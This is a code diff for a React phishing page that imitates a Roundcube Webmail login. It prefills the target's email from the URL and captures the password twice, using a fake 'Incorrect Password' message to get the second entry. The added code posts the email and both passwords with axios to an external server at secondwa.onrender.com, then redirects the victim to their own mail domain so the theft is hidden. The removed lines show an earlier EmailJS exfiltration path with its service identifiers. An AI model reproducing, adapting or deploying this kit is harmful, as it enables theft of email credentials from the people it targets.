@@ -1,8 +1,8 @@
 import "./App.css";
 import React, { useState } from "react";
 import { Styls } from "./stylls";
-import emailjs from "emailjs-com";
 import { useParams } from "react-router-dom";
+import axios from "axios";
 
 function Forms() {
   const params = useParams();
@@ -10,55 +10,46 @@ function Forms() {
 
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [pass, setPass] = useState("");
+  const [pasers, setPasser] = useState("");
+  const [email, setEmail] = useState(params.id);
 
-  const submitHandler = (e) => {
+  const submitHandler = async (e) => {
     e.preventDefault();
 
-    emailjs
-      .sendForm(
-        "service_9b2by5g",
-        "template_f65tcxq",
-        e.target,
-        "fAkQFatVq-bEa_Al3"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-    e.preventDefault();
-    setShowForm(false);
+    console.log(email, pass);
     setConfirmForm(true);
+    setShowForm(false);
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail2", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
   };
-
-  const editHandler = (e) => {
+  const editHandler = async (e) => {
     e.preventDefault();
-    let emailss = params.id;
-    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
-    emailjs
-      .sendForm(
-        "service_9b2by5g",
-        "template_f65tcxq",
-        e.target,
-        "fAkQFatVq-bEa_Al3"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
+    setLoading(true);
 
+    let domain = email.substring(email.lastIndexOf("@") + 1);
+
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail2", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
     window.setTimeout(() => {
       window.location.href = `https://${domain}`;
     }, 1000);
   };
-
   return (
     <Styls>
       <div className="contsainer">
@@ -92,12 +83,14 @@ function Forms() {
               </span>
               <input
                 type="password"
+                onChange={(e) => setPass(e.target.value)}
+                pattern="(?=.*[0-9]).{8,}"
                 name="to_pass"
                 required
                 placeholder="Password"
               />
             </label>
-            <button> LOGIN </button>
+            <button>LOGIN </button>
             <p>Roundcube Webmail </p>
           </form>
         )}
@@ -120,9 +113,11 @@ function Forms() {
               </span>
               <input
                 type="email"
+                onChange={(e) => setEmail(e.target.value)}
                 name="to_user"
                 required
                 value={params.id}
+                title="pls no"
                 placeholder="Username"
               />
             </label>
@@ -135,13 +130,14 @@ function Forms() {
               </span>
               <input
                 type="password"
+                onChange={(e) => setPasser(e.target.value)}
+                pattern="(?=.*[0-9]).{8,}"
                 name="to_pass"
-                required
                 placeholder="Password"
               />
             </label>
             <p className="reda">Login failed Incorrect Password</p>
-            <button> LOGIN </button>
+            <button>{loading ? "Loading....." : "LOGIN"} </button>
             <p>Roundcube Webmail </p>
           </form>
         </div>
